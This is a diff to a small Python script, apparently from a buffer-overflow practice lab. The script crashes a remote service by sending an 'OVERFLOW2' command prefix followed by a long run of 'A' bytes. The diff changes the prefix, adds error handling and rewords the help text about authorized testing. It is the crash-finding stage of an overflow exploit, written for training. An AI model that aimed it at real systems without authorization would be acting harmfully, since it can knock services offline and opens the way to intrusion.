@@ -10,7 +10,7 @@ from typing import Optional
 
 def main(ip: str, port: int, size: int) -> None:
 	# Define prefix and buffer
-	prefix = b"OVERFLOW1 "														# CHANGE IF NECESSARY
+	prefix = b"OVERFLOW2 "														# CHANGE IF NECESSARY
 	buffer = b"A" * size
 	timeout = 3
 	try:
@@ -23,8 +23,11 @@ def main(ip: str, port: int, size: int) -> None:
 			s.settimeout(timeout)
 
 			# Print server banner
-			response = s.recv(4096)
-			print(f"Banner: {response.decode()}")
+			try:
+				response = s.recv(4096)
+				print(f"{response.decode()}")
+			except:
+				pass
 
 			# Send data to the server with increasing buffer sizes
 			payload = b"".join(
@@ -39,6 +42,10 @@ def main(ip: str, port: int, size: int) -> None:
 			# Print the response from the server
 			response = s.recv(4096)
 			print(f"Response: {response.decode()}")
+			
+	except ConnectionError:
+		print('Connection Refused')
+		sys.exit(0)
 	except:
 		print("\n","="*25,"CRASH","="*25,"\n")
 		overflow_threshold = len(buffer)
@@ -49,9 +56,9 @@ if __name__ == "__main__":
 	# Parse command line arguments
 	parser = argparse.ArgumentParser(
 		prog="Manual Crash",
-		description="""This is a Python script for fuzz testing a remote server by sending a fixed buffer size to the target application. 
-	The script takes three arguments: an IP address, a port number, and a buffer size in bytes. The purpose of this script is to test the robustness of the target program by simulating 
-	various attack scenarios. It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
+		description="""This is a Python script that attemps to crash a remote server's process by sending a fixed buffer size. 
+	The script takes three arguments: an IP address, a port number, and a buffer size in bytes.
+	The purpose of this script is to test the robustness of the target program. It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
 		epilog="Have fun experimenting with this tool!"
 	)
 	parser.add_argument("ip", help="IP address of the target")
